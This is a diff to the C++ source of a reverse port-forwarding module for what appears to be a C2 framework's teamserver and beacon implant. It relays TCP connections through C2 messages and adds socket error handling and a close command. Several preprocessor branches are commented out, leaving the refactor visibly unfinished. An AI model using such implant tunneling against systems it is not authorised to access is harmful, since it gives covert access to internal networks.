@@ -6,6 +6,9 @@
 #include <chrono>
 #include <cstring>
 #include <sstream>
+#include <cerrno>
+#include <memory>
+#include <vector>
 
 #ifdef _WIN32
     #include <winsock2.h>
@@ -49,9 +52,9 @@ namespace
     bool setNonBlocking(int socket)
     {
         int flags = fcntl(socket, F_GETFL, 0);
-        if(flags == -1)
+        if (flags == -1)
             return false;
-        if(fcntl(socket, F_SETFL, flags | O_NONBLOCK) == -1)
+        if (fcntl(socket, F_SETFL, flags | O_NONBLOCK) == -1)
             return false;
         return true;
     }
@@ -71,53 +74,55 @@ extern "C" __attribute__((visibility("default"))) ReversePortForward* ReversePor
 #endif
 
 ReversePortForward::ReversePortForward()
-#ifdef BUILD_TEAMSERVER
+// #if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS)
     : ModuleCmd(std::string(moduleName), moduleHash)
     , m_localPort(0)
     , m_remotePort(0)
     , m_socketLayerReady(false)
-#else
-    : ModuleCmd("", moduleHash)
+// #else
+    // , ModuleCmd("", moduleHash)
     , m_running(false)
     , m_listenerActive(false)
-    , m_remotePort(0)
+    // , m_remotePort(0)
     , m_listenerSocket(InvalidSocket)
+    , m_listenerThread()
     , m_nextConnectionId(1)
-    , m_socketLayerReady(false)
-#endif
+    // , m_socketLayerReady(false)
+// #endif
 {
 }
 
 ReversePortForward::~ReversePortForward()
 {
-#ifdef BUILD_TEAMSERVER
+#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS)
     std::lock_guard<std::mutex> lock(m_localMutex);
-    for(auto& entry : m_localConnections)
+    for (auto& entry : m_localConnections)
     {
-        if(entry.second != InvalidSocket)
+        if (entry.second != InvalidSocket)
             closeSocket(entry.second);
     }
     m_localConnections.clear();
-    shutdownSocketLayer();
 #else
     m_running = false;
-    if(m_listenerThread.joinable())
+    if (m_listenerThread.joinable())
         m_listenerThread.join();
 
     {
         std::lock_guard<std::mutex> lock(m_connectionsMutex);
-        for(auto& pair : m_connections)
+        for (auto& pair : m_connections)
         {
             auto& connection = pair.second;
-            if(connection && connection->socket != InvalidSocket)
+            if (connection && connection->socket != InvalidSocket)
                 closeSocket(connection->socket);
         }
         m_connections.clear();
     }
-    if(m_listenerSocket != InvalidSocket)
+
+    if (m_listenerSocket != InvalidSocket)
         closeSocket(m_listenerSocket);
-    shutdownSocketLayer();
 #endif
+
+    shutdownSocketLayer();
 }
 
 std::string ReversePortForward::getInfo()
@@ -149,7 +154,7 @@ int ReversePortForward::init(std::vector<std::string>& splitedCmd, C2Message& c2
         m_remotePort = std::stoi(remotePortStr);
         m_localPort = std::stoi(localPortStr);
     }
-    catch(const std::exception&)
+    catch (const std::exception&)
     {
         c2Message.set_returnvalue("Invalid port provided.\n" + formatHelp());
         return -1;
@@ -166,13 +171,16 @@ int ReversePortForward::init(std::vector<std::string>& splitedCmd, C2Message& c2
     c2Message.set_instruction(splitedCmd[0]);
     c2Message.set_cmd("start");
     c2Message.set_args(remotePortStr + " " + localHost + " " + localPortStr);
+#else
+    (void)splitedCmd;
+    (void)c2Message;
 #endif
     return 0;
 }
 
 int ReversePortForward::errorCodeToMsg(const C2Message& c2RetMessage, std::string& errorMsg)
 {
-#ifdef BUILD_TEAMSERVER
+#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS)
     switch (c2RetMessage.errorCode())
     {
     case 1:
@@ -199,8 +207,6 @@ int ReversePortForward::errorCodeToMsg(const C2Message& c2RetMessage, std::strin
 #endif
     return 0;
 }
-
-#ifdef BUILD_TEAMSERVER
 
 bool ReversePortForward::ensureSocketLayer()
 {
@@ -241,6 +247,19 @@ void ReversePortForward::closeSocket(SocketHandle socket) const
 #endif
 }
 
+void ReversePortForward::enqueueChunk(int connectionId, const std::string& data, bool closeEvent)
+{
+    {
+        std::lock_guard<std::mutex> lock(m_queueMutex);
+        m_pendingChunks.push({connectionId, data, closeEvent});
+    }
+#if !(defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS))
+    m_queueCv.notify_all();
+#endif
+}
+
+// #if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS)
+
 bool ReversePortForward::sendAll(SocketHandle socket, const std::string& data) const
 {
     if (socket == InvalidSocket)
@@ -253,18 +272,41 @@ bool ReversePortForward::sendAll(SocketHandle socket, const std::string& data) c
     while (totalSent < toSend)
     {
         int sent = ::send(socket, buffer + totalSent, static_cast<int>(toSend - totalSent), 0);
-        if (sent <= 0)
+        if (sent > 0)
+        {
+            totalSent += static_cast<size_t>(sent);
+            continue;
+        }
+
+        if (sent == 0)
             return false;
-        totalSent += static_cast<size_t>(sent);
+
+#ifdef _WIN32
+        int err = WSAGetLastError();
+        if (err == WSAEWOULDBLOCK || err == WSAEINTR)
+        {
+            std::this_thread::sleep_for(std::chrono::milliseconds(10));
+            continue;
+        }
+#else
+        if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
+        {
+            std::this_thread::sleep_for(std::chrono::milliseconds(10));
+            continue;
+        }
+#endif
+        return false;
     }
     return true;
 }
 
-std::string ReversePortForward::receiveAvailable(SocketHandle socket) const
+std::string ReversePortForward::receiveAvailable(SocketHandle socket, bool& closed) const
 {
     std::string data;
     if (socket == InvalidSocket)
         return data;
+
+    closed = false;
 
     while (true)
     {
@@ -282,169 +324,65 @@ std::string ReversePortForward::receiveAvailable(SocketHandle socket) const
 
         char buffer[4096];
         int received = ::recv(socket, buffer, sizeof(buffer), 0);
-        if (received <= 0)
+        if (received > 0)
+        {
+            data.append(buffer, received);
+            continue;
+        }
+
+        if (received == 0)
+        {
+            closed = true;
             break;
-        data.append(buffer, received);
+        }
+
+#ifdef _WIN32
+        int err = WSAGetLastError();
+        if (err == WSAEWOULDBLOCK || err == WSAEINTR)
+            break;
+        closed = true;
+#else
+        if (errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
+            break;
+        closed = true;
+#endif
+        break;
     }
 
     return data;
 }
 
-int ReversePortForward::followUp(const C2Message& c2RetMessage)
+void ReversePortForward::pollLocalConnections()
 {
-    if (!ensureSocketLayer())
-        return -1;
+    std::vector<PendingChunk> readyChunks;
 
-    std::string args = c2RetMessage.args();
-    if (args.empty())
-        return 0;
-
-    auto pos = args.find(':');
-    if (pos == std::string::npos)
-        return 0;
-
-    std::string action = args.substr(0, pos);
-    int connectionId = 0;
-    try
     {
-        connectionId = std::stoi(args.substr(pos + 1));
-    }
-    catch (const std::exception&)
-    {
-        return 0;
-    }
-
-    std::lock_guard<std::mutex> lock(m_localMutex);
-
-    if (action == "close")
-    {
-        auto it = m_localConnections.find(connectionId);
-        if (it != m_localConnections.end())
+        std::lock_guard<std::mutex> lock(m_localMutex);
+        for (auto it = m_localConnections.begin(); it != m_localConnections.end();)
         {
-            closeSocket(it->second);
-            m_localConnections.erase(it);
-        }
-        return 0;
-    }
-    else if (action != "data")
-    {
-        return 0;
-    }
+            bool closed = false;
+            std::string data = receiveAvailable(it->second, closed);
+            if (!data.empty())
+                readyChunks.push_back({it->first, data, false});
 
-    std::string payload = c2RetMessage.data();
-    if (payload.empty())
-        return 0;
-
-    SocketHandle socket = InvalidSocket;
-    auto it = m_localConnections.find(connectionId);
-    if (it != m_localConnections.end())
-        socket = it->second;
-
-    if (socket == InvalidSocket)
-    {
-        std::string portStr = std::to_string(m_localPort);
-        struct addrinfo hints;
-        std::memset(&hints, 0, sizeof(hints));
-        hints.ai_family = AF_UNSPEC;
-        hints.ai_socktype = SOCK_STREAM;
-        hints.ai_protocol = IPPROTO_TCP;
-
-        struct addrinfo* result = nullptr;
-        if (::getaddrinfo(m_localHost.c_str(), portStr.c_str(), &hints, &result) != 0)
-        {
-            return -1;
-        }
-
-        for (auto ptr = result; ptr != nullptr; ptr = ptr->ai_next)
-        {
-            SocketHandle candidate = static_cast<SocketHandle>(::socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol));
-            if (candidate == InvalidSocket)
-                continue;
-
-            if (::connect(candidate, ptr->ai_addr, static_cast<int>(ptr->ai_addrlen)) == 0)
+            if (closed)
             {
-                socket = candidate;
-                break;
+                closeSocket(it->second);
+                readyChunks.push_back({it->first, std::string(), true});
+                it = m_localConnections.erase(it);
             }
-            closeSocket(candidate);
+            else
+            {
+                ++it;
+            }
         }
-
-        ::freeaddrinfo(result);
-
-        if (socket == InvalidSocket)
-        {
-            return -1;
-        }
-
-        setNonBlocking(socket);
-        m_localConnections[connectionId] = socket;
     }
 
-    if (!sendAll(socket, payload))
-    {
-        closeSocket(socket);
-        m_localConnections.erase(connectionId);
-        return -1;
-    }
-
-    return 0;
+    for (const auto& chunk : readyChunks)
+        enqueueChunk(chunk.connectionId, chunk.data, chunk.closeEvent);
 }
 
-int ReversePortForward::process(C2Message& c2Message, C2Message& c2RetMessage)
-{
-    c2RetMessage.set_instruction(c2Message.instruction());
-    c2RetMessage.set_cmd(c2Message.cmd());
-    c2RetMessage.set_args(c2Message.args());
-    c2RetMessage.set_data(c2Message.data());
-    return 0;
-}
-
-int ReversePortForward::recurringExec(C2Message& c2RetMessage)
-{
-    (void)c2RetMessage;
-    return 0;
-}
-
-#else  // Beacon implementation
-
-bool ReversePortForward::ensureSocketLayer()
-{
-#ifdef _WIN32
-    if (m_socketLayerReady)
-        return true;
-
-    WSADATA data;
-    int rc = WSAStartup(MAKEWORD(2, 2), &data);
-    if (rc == 0)
-        m_socketLayerReady = true;
-    return m_socketLayerReady;
-#else
-    m_socketLayerReady = true;
-    return true;
-#endif
-}
-
-void ReversePortForward::shutdownSocketLayer()
-{
-#ifdef _WIN32
-    if (m_socketLayerReady)
-    {
-        WSACleanup();
-        m_socketLayerReady = false;
-    }
-#endif
-}
-
-void ReversePortForward::closeSocket(SocketHandle socket)
-{
-#ifdef _WIN32
-    if (socket != InvalidSocket)
-        closesocket(socket);
-#else
-    if (socket != InvalidSocket)
-        ::close(socket);
-#endif
-}
+// #else
 
 ReversePortForward::SocketHandle ReversePortForward::createListener(int port)
 {
@@ -507,13 +445,6 @@ ReversePortForward::SocketHandle ReversePortForward::acceptClient(SocketHandle l
     if (client != InvalidSocket)
         setNonBlocking(client);
     return client;
-}
-
-void ReversePortForward::enqueueChunk(int connectionId, const std::string& data, bool closeEvent)
-{
-    std::lock_guard<std::mutex> lock(m_queueMutex);
-    m_pendingChunks.push({connectionId, data, closeEvent});
-    m_queueCv.notify_all();
 }
 
 std::shared_ptr<ReversePortForward::RemoteConnection> ReversePortForward::getConnection(int connectionId)
@@ -589,6 +520,137 @@ void ReversePortForward::runListener()
         connection->reader.detach();
         enqueueChunk(id, std::string(), false);
     }
+}
+
+// #endif
+
+int ReversePortForward::followUp(const C2Message& c2RetMessage)
+{
+    if (!ensureSocketLayer())
+        return -1;
+
+    std::string args = c2RetMessage.args();
+    if (args.empty())
+        return 0;
+
+    auto pos = args.find(':');
+    if (pos == std::string::npos)
+        return 0;
+
+    std::string action = args.substr(0, pos);
+    int connectionId = 0;
+    try
+    {
+        connectionId = std::stoi(args.substr(pos + 1));
+    }
+    catch (const std::exception&)
+    {
+        return 0;
+    }
+
+    if (action == "close")
+    {
+        SocketHandle socket = InvalidSocket;
+        {
+            std::lock_guard<std::mutex> lock(m_localMutex);
+            auto it = m_localConnections.find(connectionId);
+            if (it != m_localConnections.end())
+            {
+                socket = it->second;
+                m_localConnections.erase(it);
+            }
+        }
+        closeSocket(socket);
+        return 0;
+    }
+
+    if (action != "data")
+        return 0;
+
+    SocketHandle socket = InvalidSocket;
+    {
+        std::lock_guard<std::mutex> lock(m_localMutex);
+        auto it = m_localConnections.find(connectionId);
+        if (it != m_localConnections.end())
+            socket = it->second;
+    }
+
+    if (socket == InvalidSocket)
+    {
+        std::string portStr = std::to_string(m_localPort);
+        struct addrinfo hints;
+        std::memset(&hints, 0, sizeof(hints));
+        hints.ai_family = AF_UNSPEC;
+        hints.ai_socktype = SOCK_STREAM;
+        hints.ai_protocol = IPPROTO_TCP;
+
+        struct addrinfo* result = nullptr;
+        if (::getaddrinfo(m_localHost.c_str(), portStr.c_str(), &hints, &result) != 0)
+        {
+            enqueueChunk(connectionId, std::string(), true);
+            return -1;
+        }
+
+        for (auto ptr = result; ptr != nullptr; ptr = ptr->ai_next)
+        {
+            SocketHandle candidate = static_cast<SocketHandle>(::socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol));
+            if (candidate == InvalidSocket)
+                continue;
+
+            if (::connect(candidate, ptr->ai_addr, static_cast<int>(ptr->ai_addrlen)) == 0)
+            {
+                socket = candidate;
+                break;
+            }
+            closeSocket(candidate);
+        }
+
+        ::freeaddrinfo(result);
+
+        if (socket == InvalidSocket)
+        {
+            enqueueChunk(connectionId, std::string(), true);
+            return -1;
+        }
+
+        setNonBlocking(socket);
+        {
+            std::lock_guard<std::mutex> lock(m_localMutex);
+            m_localConnections[connectionId] = socket;
+        }
+    }
+
+    std::string payload = c2RetMessage.data();
+    if (!payload.empty())
+    {
+        if (!sendAll(socket, payload))
+        {
+            closeSocket(socket);
+            {
+                std::lock_guard<std::mutex> lock(m_localMutex);
+                m_localConnections.erase(connectionId);
+            }
+            enqueueChunk(connectionId, std::string(), true);
+            return -1;
+        }
+    }
+
+    bool closed = false;
+    std::string response = receiveAvailable(socket, closed);
+    if (!response.empty())
+        enqueueChunk(connectionId, response, false);
+
+    if (closed)
+    {
+        closeSocket(socket);
+        {
+            std::lock_guard<std::mutex> lock(m_localMutex);
+            m_localConnections.erase(connectionId);
+        }
+        enqueueChunk(connectionId, std::string(), true);
+    }
+
+    return 0;
 }
 
 int ReversePortForward::process(C2Message& c2Message, C2Message& c2RetMessage)
@@ -700,12 +762,64 @@ int ReversePortForward::process(C2Message& c2Message, C2Message& c2RetMessage)
 
         return 0;
     }
+    else if (cmd == "close")
+    {
+        std::string args = c2Message.args();
+        auto pos = args.find(':');
+        if (pos == std::string::npos)
+        {
+            c2RetMessage.set_errorCode(4);
+            return 0;
+        }
+
+        std::string prefix = args.substr(0, pos);
+        if (prefix != "close")
+        {
+            c2RetMessage.set_errorCode(4);
+            return 0;
+        }
+
+        int connectionId = 0;
+        try
+        {
+            connectionId = std::stoi(args.substr(pos + 1));
+        }
+        catch (const std::exception&)
+        {
+            c2RetMessage.set_errorCode(4);
+            return 0;
+        }
+
+        std::shared_ptr<RemoteConnection> connection;
+        {
+            std::lock_guard<std::mutex> lock(m_connectionsMutex);
+            auto it = m_connections.find(connectionId);
+            if (it != m_connections.end())
+            {
+                connection = it->second;
+                m_connections.erase(it);
+            }
+        }
+
+        if (connection)
+        {
+            connection->active = false;
+            closeSocket(connection->socket);
+        }
+
+        return 0;
+    }
 
     return 0;
 }
 
+// TODO, we got an architectural issue here, recurringExec and followUp are not expected to communicate between them without user intervention
+// could be usefull
 int ReversePortForward::recurringExec(C2Message& c2RetMessage)
 {
+// #if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS)
+    pollLocalConnections();
+
     std::unique_lock<std::mutex> lock(m_queueMutex);
     if (m_pendingChunks.empty())
         return 0;
@@ -723,18 +837,39 @@ int ReversePortForward::recurringExec(C2Message& c2RetMessage)
     }
     else
     {
-        c2RetMessage.set_cmd("data");
-        c2RetMessage.set_args("data:" + std::to_string(chunk.connectionId));
+        c2RetMessage.set_cmd("send");
+        c2RetMessage.set_args("response:" + std::to_string(chunk.connectionId));
         c2RetMessage.set_data(chunk.data);
     }
 
     return 1;
-}
+// #else
+    // std::unique_lock<std::mutex> lock(m_queueMutex);
+    // if (m_pendingChunks.empty())
+    // {
+    //     m_queueCv.wait_for(lock, std::chrono::milliseconds(100));
+    //     if (m_pendingChunks.empty())
+    //         return 0;
+    // }
 
-int ReversePortForward::followUp(const C2Message& c2RetMessage)
-{
-    (void)c2RetMessage;
-    return 0;
-}
+    // PendingChunk chunk = m_pendingChunks.front();
+    // m_pendingChunks.pop();
+    // lock.unlock();
 
-#endif
+    // c2RetMessage.set_instruction(std::to_string(getHash()));
+    // if (chunk.closeEvent)
+    // {
+    //     c2RetMessage.set_cmd("close");
+    //     c2RetMessage.set_args("close:" + std::to_string(chunk.connectionId));
+    //     c2RetMessage.set_data("");
+    // }
+    // else
+    // {
+    //     c2RetMessage.set_cmd("send");
+    //     c2RetMessage.set_args("data:" + std::to_string(chunk.connectionId));
+    //     c2RetMessage.set_data(chunk.data);
+    // }
+
+    // return 1;
+// #endif
+}
